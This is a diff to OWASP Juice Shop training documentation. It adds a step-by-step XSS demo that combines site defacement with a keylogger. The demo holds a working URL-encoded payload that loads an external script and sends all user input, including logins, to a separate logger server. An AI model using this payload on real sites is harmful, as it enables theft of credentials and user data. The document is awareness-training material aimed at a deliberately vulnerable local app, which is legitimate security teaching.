@@ -110,9 +110,29 @@ demonstrate certain categories of vulnerabilities.
 | [Forgotten Developer Backup](../part2/sensitive-data-exposure.md#access-a-developers-forgotten-backup-file)         | Sensitive Data Exposure    | ⭐⭐⭐⭐     | ⏳⏳⏳           | Explain _Poison Null Byte_                                                                                                                                                                                                                                                                                                                               |
 | [Forged Coupon](../part2/cryptographic-issues.md#forge-a-coupon-code-that-gives-you-a-discount-of-at-least-80)      | Cryptographic Issues       | ⭐⭐⭐⭐⭐⭐  | ⏳⏳⏳⏳          | [Forgotten Developer Backup](../part2/sensitive-data-exposure.md#access-a-developers-forgotten-backup-file) and `z85-cli` installed **or** [Forgotten Sales Backup](../part2/sensitive-data-exposure.md#access-a-salesmans-forgotten-backup-file) **or** tracing coupons from Twitter/Reddit back to <https://travis-ci.org/bkimminich/juicy-coupon-bot> |
 
+## XSS demo
+
 A particularly impressive
 [showcase of XSS site-defacement combined with a keylogger](https://github.com/wurstbrot/shake-logger)
-is provided explicitly for live demos and awareness trainings.
+is provided explicitly for live demos and awareness trainings:
+
+1. Install [Docker](https://www.docker.com/).
+2. Run `git clone https://github.com/wurstbrot/shake-logger`.
+3. Run `cd shake-logger` and then `docker-compose up`.
+4. Turn on your speakers and make sure your browser is allowed to play
+   sound.
+5. Open
+   [this link](http://localhost:3000/#/search?q=%3Cimg%20src%3D%22bha%22%20onError%3D%27javascript%3Aeval%28%60var%20js%3Ddocument.createElement%28%22script%22%29%3Bjs.type%3D%22text%2Fjavascript%22%3Bjs.src%3D%22http%3A%2F%2Flocalhost%3A8080%2Fshake.js%22%3Bdocument.body.appendChild%28js%29%3Bvar%20hash%3Dwindow.location.hash%3Bwindow.location.hash%3D%22%23%2Fsearch%3Fq%3Dapple%22%3BsearchQuery.value%20%3D%20%22apple%22%3B%60%29%27%3C%2Fimg%3Eapple)
+   to launch the XSS demo (🔊).
+6. Use the application normally, e.g. doing a search and logging in with
+   some user.
+7. In a new tab go to <http://localhost:8080/logger.php> to see that all
+   user input was transmitted to a third-party server.
+8. Show the Network tab of the browser window with Juice Shop to see the
+   requests that are sent to the `logger.php` script.
+9. Reload the Juice Shop with `F5` and use the application a bit more.
+10. You will see that no more logging takes place as XSS payload was
+    removed during the reload.
 
 There is also a video recording available on YouTube:
 <https://www.youtube.com/watch?v=L7ZEMWRm7LA>. This is a good fallback
